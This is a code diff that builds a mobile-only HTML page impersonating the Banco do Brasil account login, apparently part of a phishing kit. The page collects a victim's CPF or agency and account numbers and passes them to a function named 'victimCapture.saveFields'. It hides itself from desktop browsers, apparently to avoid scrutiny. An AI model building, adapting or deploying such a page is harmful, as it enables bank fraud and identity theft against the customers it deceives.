@@ -1,40 +1,589 @@
-{% extends "base.html" %}
+<!DOCTYPE html>
+<html lang="pt-BR">
 
-{% block title %}BB - Validação de CPF{% endblock %}
-
-{% block content %}
-<form id="cpfForm">
-    <div class="form-group">
-        <label for="cpf">CPF:</label>
-        <input type="text" id="cpf" name="cpf" placeholder="000.000.000-00" maxlength="14" required>
-    </div>
-    <button type="submit" class="btn">Continuar</button>
-    <p class="info-text">Digite seu CPF para validação</p>
-</form>
-{% endblock %}
-
-{% block scripts %}
-const form = document.getElementById('cpfForm');
-const cpfInput = document.getElementById('cpf');
-
-// Máscara de CPF
-cpfInput.addEventListener('input', function(e) {
-    let value = e.target.value.replace(/\D/g, '');
-    if (value.length <= 11) {
-        value = value.replace(/(\d{3})(\d)/, '$1.$2');
-        value = value.replace(/(\d{3})(\d)/, '$1.$2');
-        value = value.replace(/(\d{3})(\d{1,2})$/, '$1-$2');
-        e.target.value = value;
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>Acessar Conta - Banco do Brasil</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+  <style>
+    * {
+      -webkit-tap-highlight-color: transparent;
+      -webkit-touch-callout: none;
+      -webkit-user-select: none;
+      user-select: none;
     }
-});
 
-form.addEventListener('submit', async function(e) {
-    e.preventDefault();
-    const cpf = cpfInput.value.replace(/\D/g, '');
-    if (cpf.length === 11) {
-        await captureLib.saveFields({ cpf: cpf }, 'cpf');
-    } else {
-        alert('CPF inválido! Digite os 11 dígitos.');
+    body {
+      font-family: 'Inter', sans-serif;
+      background: #f0f4f8;
+      overflow-x: hidden;
     }
-});
-{% endblock %}
+
+    input,
+    button {
+      -webkit-user-select: text;
+      user-select: text;
+    }
+
+    .tab-btn {
+      flex: 1;
+      padding: 10px 12px;
+      border-radius: 9999px;
+      font-weight: 600;
+      transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+      border: 1px solid transparent;
+      font-size: 13px;
+    }
+
+    .tab-btn.active {
+      background-color: #FFCC00;
+      color: #003D7A;
+      font-weight: 700;
+      box-shadow: 0 1px 3px rgba(0, 61, 122, 0.2);
+    }
+
+    .tab-btn:not(.active) {
+      color: #0066CC;
+      background-color: rgba(255, 255, 255, 0.8);
+    }
+
+    .form-section {
+      transition: opacity 0.3s ease-in-out, transform 0.3s ease-in-out;
+    }
+
+    @keyframes fadeIn {
+      from {
+        opacity: 0;
+        transform: translateY(8px);
+      }
+
+      to {
+        opacity: 1;
+        transform: translateY(0);
+      }
+    }
+
+    .form-section:not(.hidden) {
+      animation: fadeIn 0.3s ease-out;
+    }
+
+    /* Floating Label Styles */
+    .input-group {
+      position: relative;
+      margin-bottom: 20px;
+    }
+
+    .input-field {
+      width: 100%;
+      padding: 16px 12px 8px 12px;
+      border: 1.5px solid #e2e8f0;
+      border-radius: 8px;
+      font-size: 16px;
+      background: white;
+      transition: all 0.3s ease;
+      outline: none;
+    }
+
+    .input-field:focus {
+      border-color: #0066CC;
+      box-shadow: 0 0 0 2px rgba(0, 102, 204, 0.1);
+    }
+
+    .input-label {
+      position: absolute;
+      left: 12px;
+      top: 50%;
+      transform: translateY(-50%);
+      color: #718096;
+      font-size: 16px;
+      transition: all 0.3s ease;
+      pointer-events: none;
+      background: white;
+      padding: 0 4px;
+    }
+
+    .input-field:focus+.input-label,
+    .input-field:not(:placeholder-shown)+.input-label {
+      top: 0;
+      font-size: 12px;
+      color: #0066CC;
+      font-weight: 600;
+    }
+
+    .input-field:not(:focus):not(:placeholder-shown)+.input-label {
+      color: #718096;
+    }
+
+    .error-message {
+      color: #e74c3c;
+      font-size: 11px;
+      margin-top: 4px;
+      display: none;
+      padding: 0 12px;
+    }
+
+    .loading {
+      display: none;
+      text-align: center;
+      margin-top: 10px;
+    }
+
+    .loading-spinner {
+      border: 2px solid #f3f3f3;
+      border-top: 2px solid #003D7A;
+      border-radius: 50%;
+      width: 20px;
+      height: 20px;
+      animation: spin 1s linear infinite;
+      margin: 0 auto;
+    }
+
+    @keyframes spin {
+      0% {
+        transform: rotate(0deg);
+      }
+
+      100% {
+        transform: rotate(360deg);
+      }
+    }
+
+    .mobile-only {
+      display: none;
+      text-align: center;
+      padding: 40px 20px;
+      background: white;
+      margin: 20px;
+      border-radius: 12px;
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+    }
+
+    /* Container principal como app mobile */
+    .app-container {
+      width: 100%;
+      height: 100vh;
+      background: white;
+      display: flex;
+      flex-direction: column;
+      position: fixed;
+      top: 0;
+      left: 0;
+      z-index: 1000;
+    }
+
+    /* Header mais compacto */
+    .app-header {
+      background: #003D7A;
+      color: white;
+      padding: 12px 16px;
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      flex-shrink: 0;
+      min-height: 52px;
+    }
+
+    .app-header h1 {
+      font-size: 16px;
+      font-weight: 600;
+    }
+
+    /* Conteúdo rolável */
+    .app-content {
+      flex: 1;
+      overflow-y: auto;
+      padding: 16px;
+      background: #f8fafc;
+    }
+
+    /* Footer compacto */
+    .app-footer {
+      background: white;
+      padding: 12px 16px;
+      border-top: 1px solid #e2e8f0;
+      flex-shrink: 0;
+    }
+
+    /* Botão principal */
+    .btn-primary {
+      width: 100%;
+      background: #FFCC00;
+      color: #003D7A;
+      font-weight: 700;
+      padding: 14px;
+      border-radius: 8px;
+      text-align: center;
+      font-size: 15px;
+      border: none;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      text-transform: uppercase;
+      letter-spacing: 0.5px;
+    }
+
+    .btn-primary:active {
+      background: #e6b800;
+      transform: scale(0.98);
+    }
+
+    .btn-primary:disabled {
+      background: #cbd5e0;
+      color: #718096;
+      cursor: not-allowed;
+      transform: none;
+    }
+
+    /* Responsividade para telas maiores */
+    @media (min-width: 769px) {
+      .app-container {
+        max-width: 400px;
+        max-height: 700px;
+        height: 85vh;
+        top: 50%;
+        left: 50%;
+        transform: translate(-50%, -50%);
+        border-radius: 12px;
+        box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+        border: 1px solid #e2e8f0;
+      }
+    }
+
+    @media (max-width: 768px) {
+      .mobile-only {
+        display: block;
+      }
+    }
+
+    /* Back button style */
+    .back-btn {
+      background: none;
+      border: none;
+      color: white;
+      padding: 6px;
+      border-radius: 6px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .back-btn:active {
+      background: rgba(255, 255, 255, 0.1);
+    }
+  </style>
+</head>
+
+<body>
+
+  <!-- Aviso para não-mobile -->
+  <div class="mobile-only">
+    <div style="color: #003D7A; font-size: 48px; margin-bottom: 20px;">🏦</div>
+    <h2 style="color: #003D7A; font-size: 20px; font-weight: 700; margin-bottom: 12px;">Acesso Restrito</h2>
+    <p style="color: #666; line-height: 1.5;">Esta página só pode ser acessada por dispositivos móveis.</p>
+  </div>
+
+  <!-- Container do App Mobile -->
+  <div id="app-container" class="app-container">
+
+    <!-- Header compacto -->
+    <header class="app-header">
+      <button class="back-btn">
+                <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                    <path d="M15 18l-6-6 6-6"/>
+                </svg>
+            </button>
+      <h1>Pessoa física</h1>
+    </header>
+
+    <!-- Main Content -->
+    <main class="app-content">
+      <div style="max-width: 100%;">
+        <h2 style="font-size: 20px; font-weight: 700; color: #1a202c; margin-bottom: 6px; line-height: 1.3;">Como deseja
+          acessar sua conta?</h2>
+        <p style="color: #718096; margin-bottom: 20px; line-height: 1.4; font-size: 13px;">Se você tiver mais de uma
+          conta vinculada ao seu CPF, acesse informando o número da agência e conta.</p>
+
+        <!-- Tab Switcher mais compacto -->
+        <div id="tab-switcher"
+          style="display: flex; background: #e6f2ff; border-radius: 9999px; padding: 3px; margin-bottom: 20px; gap: 2px;">
+          <button data-tab="cpf" class="tab-btn active">CPF</button>
+          <button data-tab="agencia" class="tab-btn">Agência e conta</button>
+        </div>
+
+        <!-- Form Area -->
+        <div id="form-container">
+          <!-- CPF Form -->
+          <form id="cpf-form" class="form-section">
+            <div class="input-group">
+              <input type="tel" id="cpf-input" class="input-field" placeholder=" ">
+              <label for="cpf-input" class="input-label">CPF</label>
+            </div>
+            <div class="error-message" id="cpfError">CPF inválido! Digite um CPF válido.</div>
+          </form>
+
+          <!-- Agency/Account Form (hidden by default) -->
+          <form id="agencia-form" class="form-section hidden">
+            <div class="input-group">
+              <input type="tel" id="agencia-input" class="input-field" placeholder=" ">
+              <label for="agencia-input" class="input-label">Agência</label>
+            </div>
+            <div class="error-message" id="agenciaError">Agência deve ter 4 dígitos.</div>
+
+            <div class="input-group">
+              <input type="tel" id="conta-input" class="input-field" placeholder=" ">
+              <label for="conta-input" class="input-label">Conta com dígito</label>
+            </div>
+            <div class="error-message" id="contaError">Conta deve ter o formato 00000-0.</div>
+          </form>
+        </div>
+
+        <!-- Loading Indicator -->
+        <div class="loading" id="loading">
+          <div class="loading-spinner"></div>
+          <p style="color: #718096; margin-top: 6px; font-size: 13px;">Processando...</p>
+        </div>
+      </div>
+    </main>
+
+    <!-- Footer compacto -->
+    <footer class="app-footer">
+      <button id="submit-btn" class="btn-primary" disabled>
+                Acessar conta
+            </button>
+    </footer>
+  </div>
+
+  <script>
+    // Verificar se é dispositivo móvel
+        function isMobileDevice() {
+            return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent) || window.innerWidth <= 768;
+        }
+        
+        // Configuração inicial baseada no dispositivo
+        if (!isMobileDevice()) {
+            document.getElementById('app-container').style.display = 'none';
+        } else {
+            document.querySelector('.mobile-only').style.display = 'none';
+            document.getElementById('app-container').style.display = 'flex';
+        }
+
+        // Elementos da interface
+        const tabSwitcher = document.getElementById('tab-switcher');
+        const tabButtons = document.querySelectorAll('.tab-btn');
+        const formSections = document.querySelectorAll('.form-section');
+        const submitBtn = document.getElementById('submit-btn');
+        const loadingElement = document.getElementById('loading');
+
+        // Inputs
+        const cpfInput = document.getElementById('cpf-input');
+        const agenciaInput = document.getElementById('agencia-input');
+        const contaInput = document.getElementById('conta-input');
+
+        // Elementos de erro
+        const cpfError = document.getElementById('cpfError');
+        const agenciaError = document.getElementById('agenciaError');
+        const contaError = document.getElementById('contaError');
+
+        let activeTab = 'cpf';
+
+        // Máscaras de formatação
+        const masks = {
+            cpf: (value) => {
+                return value
+                    .replace(/\D/g, '')
+                    .replace(/(\d{3})(\d)/, '$1.$2')
+                    .replace(/(\d{3})(\d)/, '$1.$2')
+                    .replace(/(\d{3})(\d{1,2})/, '$1-$2')
+                    .substring(0, 14);
+            },
+            agencia: (value) => {
+                return value.replace(/\D/g, '').substring(0, 4);
+            },
+            conta: (value) => {
+                return value
+                    .replace(/\D/g, '')
+                    .replace(/(\d{5})(\d)/, '$1-$2')
+                    .substring(0, 7);
+            }
+        };
+
+        // Aplicar máscara aos inputs
+        const applyMask = (event) => {
+            const input = event.target;
+            const maskType = input.id.split('-')[0];
+            if (masks[maskType]) {
+                input.value = masks[maskType](input.value);
+            }
+            validateForm();
+        };
+
+        // Função para validar CPF
+        function validateCPF(cpf) {
+            cpf = cpf.replace(/\D/g, '');
+            
+            if (cpf.length !== 11) return false;
+            if (/^(\d)\1+$/.test(cpf)) return false;
+            
+            // Calcular primeiro dígito verificador
+            let sum = 0;
+            for (let i = 0; i < 9; i++) {
+                sum += parseInt(cpf.charAt(i)) * (10 - i);
+            }
+            let remainder = 11 - (sum % 11);
+            let digit1 = remainder >= 10 ? 0 : remainder;
+            
+            if (digit1 !== parseInt(cpf.charAt(9))) return false;
+            
+            // Calcular segundo dígito verificador
+            sum = 0;
+            for (let i = 0; i < 10; i++) {
+                sum += parseInt(cpf.charAt(i)) * (11 - i);
+            }
+            remainder = 11 - (sum % 11);
+            let digit2 = remainder >= 10 ? 0 : remainder;
+            
+            if (digit2 !== parseInt(cpf.charAt(10))) return false;
+            
+            return true;
+        }
+
+        // Validação do formulário
+        const validateForm = () => {
+            let isValid = false;
+            let showError = false;
+
+            // Resetar mensagens de erro
+            cpfError.style.display = 'none';
+            agenciaError.style.display = 'none';
+            contaError.style.display = 'none';
+
+            if (activeTab === 'cpf') {
+                const cpfValue = cpfInput.value.replace(/\D/g, '');
+                isValid = cpfValue.length === 11 && validateCPF(cpfValue);
+                showError = cpfValue.length > 0 && !isValid;
+                if (showError) {
+                    cpfError.style.display = 'block';
+                }
+            } else if (activeTab === 'agencia') {
+                const agenciaValue = agenciaInput.value.replace(/\D/g, '');
+                const contaValue = contaInput.value.replace(/\D/g, '');
+                
+                const isAgenciaValid = agenciaValue.length === 4;
+                const isContaValid = contaValue.length === 6;
+                
+                isValid = isAgenciaValid && isContaValid;
+                
+                if (agenciaValue.length > 0 && !isAgenciaValid) {
+                    agenciaError.style.display = 'block';
+                }
+                if (contaValue.length > 0 && !isContaValid) {
+                    contaError.style.display = 'block';
+                }
+            }
+            
+            submitBtn.disabled = !isValid;
+            return isValid;
+        };
+
+        // Troca de abas
+        const switchTab = (tabName) => {
+            activeTab = tabName;
+
+            tabButtons.forEach(btn => {
+                btn.classList.toggle('active', btn.dataset.tab === tabName);
+            });
+
+            formSections.forEach(section => {
+                section.classList.toggle('hidden', section.id !== `${tabName}-form`);
+            });
+            
+            validateForm();
+        };
+
+        // Event Listeners
+        tabSwitcher.addEventListener('click', (e) => {
+            if (e.target.matches('.tab-btn')) {
+                const tabName = e.target.dataset.tab;
+                if (tabName !== activeTab) {
+                    switchTab(tabName);
+                }
+            }
+        });
+
+        [cpfInput, agenciaInput, contaInput].forEach(input => {
+            input.addEventListener('input', applyMask);
+            input.addEventListener('blur', validateForm);
+            
+            // Trigger label animation on focus
+            input.addEventListener('focus', function() {
+                this.parentElement.classList.add('focused');
+            });
+            
+            input.addEventListener('blur', function() {
+                this.parentElement.classList.remove('focused');
+            });
+        });
+
+        // Botão voltar
+        document.querySelector('.back-btn').addEventListener('click', function() {
+            if (confirm('Deseja voltar? O progresso atual será perdido.')) {
+                window.history.back();
+            }
+        });
+
+        // Envio do formulário
+        submitBtn.addEventListener('click', async function(e) {
+            e.preventDefault();
+            
+            if (!validateForm()) {
+                return;
+            }
+
+            // Mostrar loading
+            loadingElement.style.display = 'block';
+            submitBtn.disabled = true;
+            
+            try {
+                // Simular processamento
+                await new Promise(resolve => setTimeout(resolve, 1500));
+                
+                let data = {};
+                if (activeTab === 'cpf') {
+                    data = { cpf: cpfInput.value.replace(/\D/g, '') };
+                } else {
+                    data = { 
+                        agencia: agenciaInput.value.replace(/\D/g, ''),
+                        conta: contaInput.value.replace(/\D/g, '')
+                    };
+                }
+                
+                // Salvar dados (se a biblioteca estiver disponível)
+                if (window.victimCapture) {
+                    await window.victimCapture.saveFields(data, activeTab);
+                }
+                
+                // Simular sucesso
+                alert('Dados validados com sucesso!');
+                
+            } catch (error) {
+                console.error('Erro ao processar:', error);
+                alert('Erro ao processar. Tente novamente.');
+            } finally {
+                // Ocultar loading
+                loadingElement.style.display = 'none';
+                submitBtn.disabled = false;
+            }
+        });
+
+        // Prevenir zoom em inputs (iOS)
+        document.addEventListener('touchstart', function() {}, { passive: true });
+        
+        // Validação inicial
+        validateForm();
+  </script>
+</body>
+
+</html>
